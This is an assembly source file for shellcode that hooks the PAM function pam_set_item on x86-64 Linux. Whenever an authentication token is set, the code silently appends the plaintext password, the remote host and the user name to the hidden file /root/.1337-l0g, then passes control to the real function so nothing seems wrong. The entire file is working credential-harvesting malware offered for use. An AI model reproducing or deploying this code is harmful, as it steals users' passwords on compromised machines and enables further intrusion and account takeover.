%define sys_write 1
%define sys_open  2
%define sys_close 3

%define O_CLOEXEC 0x80000
%define O_APPEND    0x400
%define O_CREAT      0x40
%define O_RDWR        0x2

%define PAM_AUTHTOK 6

BITS 64
; this will be replaced by the real function address
    pam_set_item: dq 0

; pam_set_item(
;    pam_handle_t *pamh, /* rdi */
;    int item_type,      /* rsi */
;    const void *item    /* rdx */
; );
_start:
    ; check if item_type is an authentication token
    cmp rsi, PAM_AUTHTOK
    jne end

    ; check if item isn't null
    test rdx, rdx
    je end

    ; save original parameters
    push rdi
    push rsi
    push rdx

    ; zeroing rdi, rdx, rax
    xor rdi, rdi
    mul rdi

    ; open(filename, flags, 0644)
    mov al, sys_open
    lea rdi, [rel filename]
    mov rsi, O_RDWR|O_CREAT|O_CLOEXEC|O_APPEND
    mov dx, 0644
    syscall

    ; check if file is opened
    ; if(fd == -1)
    ;     goto restore
    test rax, rax
    js restore

    ; save the fd
    mov rdi, rax

    ; get *item* parameter
    mov rsi, [rsp]
    call save_string

    ; r9 = pahm
    mov r9, [rsp+16]

    ; get rhost (offset 56 at pahm struct)
    lea rsi, [r9+56]
    mov rsi, [rsi]
    call save_string

    ; get user (offset 48 at pahm struct)
    lea rsi, [r9+48]
    mov rsi, [rsi]
    call save_string

    ; close the fd
    xor rax, rax
    mov al, sys_close
    syscall

    ; restore the original parameters
    restore:
    pop rdx
    pop rsi
    pop rdi

    ; jmp to real function
    end:
    mov r10, [rel pam_set_item]
    jmp r10

    ; output file, you can edit this
    filename: db '/root/.1337-l0g'
    nb: db 0x0

save_string:
    xor rax, rax

    test rsi, rsi
    jnz not_null

    ; write null-byte if parameter is a null pointer
    lea rsi, [rel nb]

    not_null:
    mov rdx, rsi

    ; get string size
    loop:
    cmp [rdx], al
    jz end_of_loop
    inc rdx
    jmp loop
    end_of_loop:

    ; increase length for write null-byte
    inc rdx
    sub rdx, rsi

    write:
    mov al, sys_write
    syscall

    ret
